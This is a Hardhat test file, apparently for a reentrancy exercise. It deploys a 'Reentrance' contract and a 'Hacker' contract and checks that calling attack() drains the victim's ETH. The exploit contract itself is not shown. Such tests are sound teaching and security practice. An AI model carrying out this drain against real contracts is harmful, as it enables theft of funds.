import { expect } from "chai";
import { ethers } from "hardhat";
import { parseEther } from "ethers/lib/utils";
import { BigNumber } from "ethers";

describe("Reentrancy Attack in Progress", function () {
  let reentranceContract: Contract;
  let hackerContract: Contract;
  let aliceAddress: Signer;

  before(async function () {
    //Deploy the Reentrancy Contract
    const reentranceFactory = await ethers.getContractFactory("Reentrance");
    reentranceContract = await reentranceFactory.deploy();
    await reentranceContract.deployed();

    //This give us one addresse with a lot of Eth in her wallet.
    [aliceAddress] = await ethers.getSigners();

    //Alice Sends 0.001 ETH to the Reentracy Contract
    let tx = await reentranceContract
      .connect(aliceAddress)
      .donate(aliceAddress.address, {
        value: parseEther("0.001"),
      });

    await tx.wait();
  });

  it("The Reentrancy Contract Balance should be 0.001 ETH", async function () {
    const balanceETH = await ethers.provider.getBalance(
      reentranceContract.address
    );

    expect(balanceETH).to.equal(parseEther("0.001"));
  });

  it("The Hacker Contract Balance should be 0.001 ETH", async function () {
    //Deploy the Hacker Contract
    const hackerFactory = await ethers.getContractFactory("Hacker");
    hackerContract = await hackerFactory.deploy(reentranceContract.address, {
      value: parseEther("0.001"),
    });
    await hackerContract.deployed();

    const balanceETHHacker = await ethers.provider.getBalance(
      hackerContract.address
    );

    expect(balanceETHHacker).to.equal(BigNumber.from("0"));
  });

  it("The Balance of The HackerContractAddress in the Reentrancy should be 0.001 ETH ", async function () {
    //Check the Mapping in the Reentrancy Contract for the HackerContract Address
    const hackerBalanceInReentrancy =
      await reentranceContract.callStatic.balances(hackerContract.address);
    expect(hackerBalanceInReentrancy).to.equal(parseEther("0.001"));
  });

  it("Should withdraw all the balance from the Reentrance Contract ", async function () {
    //Attack Function from the HAcker Contract
    let tx = await hackerContract.attack(parseEther("0.001"));
    await tx.wait();

    const balanceETH = await ethers.provider.getBalance(
      reentranceContract.address
    );

    expect(balanceETH).to.equal(BigNumber.from("0"));
  });

  it("The Hacker Contract Balance should be 0.002 ETH ", async function () {
    const balanceETH = await ethers.provider.getBalance(hackerContract.address);
    expect(balanceETH).to.equal(parseEther("0.002"));
  });
});
